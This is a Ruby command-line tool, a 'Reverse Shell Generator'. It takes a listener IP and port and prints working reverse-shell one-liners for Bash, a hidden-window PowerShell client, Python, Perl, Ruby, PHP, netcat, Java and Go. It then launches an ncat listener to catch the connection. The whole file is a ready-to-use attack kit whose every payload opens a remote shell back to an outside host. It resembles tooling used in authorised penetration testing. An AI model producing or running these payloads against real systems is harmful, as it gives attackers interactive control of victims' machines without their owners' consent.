#!/user/bin/ruby 

require 'ipaddress'
require 'colorize'

def is_valid_ip?(ip)
  IPAddress.valid?(ip)
end

def is_valid_port?(port)
  port.to_i.between?(1, 65535)
end

puts "#############################################".green
puts "#                                           #".green
puts "#   Reverse Shell Generator                 #".green
puts "#   Usage:                                  #".green
puts "#   - Enter the IP address of the listener  #".green
puts "#   - Enter the port number of the listener #".green
puts "#   - Select the shell                      #".green
puts "#############################################".green

while true

  begin
    puts "Enter the IP address: "
    ip = gets.chomp
    if !is_valid_ip?(ip)
      raise ArgumentError.new("Invalid IP address")
    end

  

    puts "Enter the port: "
    port = gets.chomp
    if !is_valid_port?(port)
      raise ArgumentError.new("Invalid port")
    end



    puts "Select the shell: "
    puts "1. Bash"
    puts "2. Windows"
    puts "3. Python" 
    puts "4. Perl"
    puts "5. Ruby"
    puts "6. PHP"
    puts "7. Netcat"
    puts "8. Java"
    puts "9. Golang"

    shell = gets.chomp
    case shell
    when "1"
      cmd = "bash -i >& /dev/tcp/#{ip}/#{port} 0>&1"
      puts "Command: #{cmd}"

    when "2"
      cmd = "powershell.exe -nop -w hidden -c $client = New-Object System.Net.Sockets.TCPClient('#{ip}',#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
      puts "Command: #{cmd}"

    when "3"
      cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
      puts "Command: #{cmd}"

    when "4"
      cmd = "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
      puts "Command: #{cmd}"

    when "5"
      cmd = "ruby -rsocket -e'f=TCPSocket.open(\"#{ip}\",#{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
      puts "Command: #{cmd}"

    when "6"
      cmd = "php -r '$sock=fsockopen(\"#{ip}\",#{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      puts "Command: #{cmd}"

    when "7"
      cmd = "nc -e /bin/sh #{ip} #{port}"
      puts "Command: #{cmd}"

    when "8"
      cmd = "r = Runtime.getRuntime()
      p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/#{ip}/#{port};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
      p.waitFor()"
      puts "Command: #{cmd}"

    when "9"
      cmd = "package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"#{ip}:#{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}"
      puts "Command: #{cmd}"
    
    else
      puts "Invalid option"
    end

    begin
      puts "Starting listener on #{ip}:#{port} with ncat"
      ncat_listener = "ncat -vlp #{port}"
      system(ncat_listener)
    rescue
      puts "Error: #{ncat_listener}"
    end

    puts "Do you want to continue? (y/n)"
    choice = gets.chomp
    break if choice.downcase == "n"
    rescue => e
      puts "Error: #{e}"
    end
end


